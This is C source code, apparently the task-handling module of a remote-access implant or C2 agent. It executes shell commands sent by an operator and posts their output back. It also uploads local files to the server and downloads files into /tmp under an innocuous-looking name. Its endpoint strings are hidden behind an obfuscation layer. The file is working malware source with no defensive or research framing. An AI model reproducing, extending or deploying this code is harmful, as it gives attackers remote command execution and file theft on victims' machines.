#define _GNU_SOURCE
#include "tasks.h"

#include "http.h"
#include "obfuscate.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/wait.h>
#include <unistd.h>

#define MAX_OUTPUT (16 * 1024)
#define MAX_TRANSFER (4 * 1024 * 1024)

static int run_command(const worker_task *task, unsigned char *output,
                       size_t *output_len)
{
    int pipefd[2];
    pid_t pid;
    ssize_t count;
    size_t total = 0;

    if (pipe(pipefd) != 0)
        return -1;
    pid = fork();
    if (pid < 0)
    {
        close(pipefd[0]);
        close(pipefd[1]);
        return -1;
    }
    if (pid == 0)
    {
        dup2(pipefd[1], STDOUT_FILENO);
        dup2(pipefd[1], STDERR_FILENO);
        close(pipefd[0]);
        close(pipefd[1]);
        char *argv[] = {"sh", "-c", (char *)task->command, NULL};
        char *envp[] = {"PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL};
        execve("/bin/sh", argv, envp);
        _exit(127);
    }
    close(pipefd[1]);
    while (total < MAX_OUTPUT)
    {
        count = read(pipefd[0], output + total, MAX_OUTPUT - total);
        if (count <= 0)
            break;
        total += (size_t)count;
    }
    close(pipefd[0]);
    waitpid(pid, NULL, 0);
    *output_len = total;
    return 0;
}

static int post_result(const worker_task *task, const unsigned char *output,
                       size_t output_len)
{
    unsigned char response[MAX_OUTPUT];
    char route[128];
    int status;
    size_t response_len = 0;
    http_conn conn;
    int result;

    const char *tasks = agent_unseal_string(STR_TASKS);
    const char *result_suffix = agent_unseal_string(STR_RESULT);
    if (snprintf(route, sizeof(route), "%s/%ld%s", tasks, task->id,
                 result_suffix) >= (int)sizeof(route))
    {
        agent_reseal();
        return -1;
    }
    agent_reseal();
    if (http_open(&conn) != 0)
        return -1;
    result = http_request(&conn, "POST", route, output, output_len, &status,
                          response, sizeof(response), &response_len);
    http_close(&conn);
    return (result == 0 && status == 200) ? 0 : -1;
}

static int task_ex_command(const worker_task *task)
{
    unsigned char output[MAX_OUTPUT];
    size_t output_len = 0;

    if (run_command(task, output, &output_len) != 0)
        return -1;
    return post_result(task, output, output_len);
}

static int task_upload(const worker_task *task)
{
    unsigned char *data = malloc(MAX_TRANSFER);
    unsigned char response[256];
    FILE *file;
    size_t size, response_len = 0;
    int status, result = -1;
    http_conn conn;

    if (!data)
        return -1;
    file = fopen(task->path, "rb");
    if (!file)
    {
        free(data);
        return -1;
    }
    size = fread(data, 1, MAX_TRANSFER, file);
    fclose(file);
    if (size && http_open(&conn) == 0)
    {
        const char *files = agent_unseal_string(STR_FILES);
        result = http_request(&conn, "POST", files, data, size, &status,
                              response, sizeof(response), &response_len);
        agent_reseal();
        http_close(&conn);
        if (status != 200)
            result = -1;
    }
    free(data);
    return result;
}

static int task_download(const worker_task *task)
{
    unsigned char *response = malloc(MAX_TRANSFER);
    char route[64], target[64];
    FILE *file;
    int status, result = -1;
    size_t response_len = 0;
    http_conn conn;

    if (!response)
        return -1;
    const char *files = agent_unseal_string(STR_FILES);
    if (snprintf(route, sizeof(route), "%s/%ld", files, task->file_id) >=
            (int)sizeof(route) ||
        snprintf(target, sizeof(target), "/tmp/ksnftc-%ld",
                 task->file_id) >= (int)sizeof(target))
    {
        agent_reseal();
        free(response);
        return -1;
    }
    agent_reseal();
    if (http_open(&conn) == 0)
    {
        result = http_request(&conn, "GET", route, NULL, 0, &status,
                              response, MAX_TRANSFER, &response_len);
        http_close(&conn);
        if (result == 0 && (status != 200 || !response_len))
            result = -1;
    }
    if (result == 0)
    {
        file = fopen(target, "wb");
        if (!file)
        {
            free(response);
            return -1;
        }
        fwrite(response, 1, response_len, file);
        fclose(file);
    }
    free(response);
    return result;
}

int task_run(const worker_task *task)
{
    switch (task->type)
    {
    case TASK_EX_COMMAND:
        return task_ex_command(task);
    case TASK_UPLOAD:
        return task_upload(task);
    case TASK_DOWNLOAD:
        return task_download(task);
    }
    return -1;
}
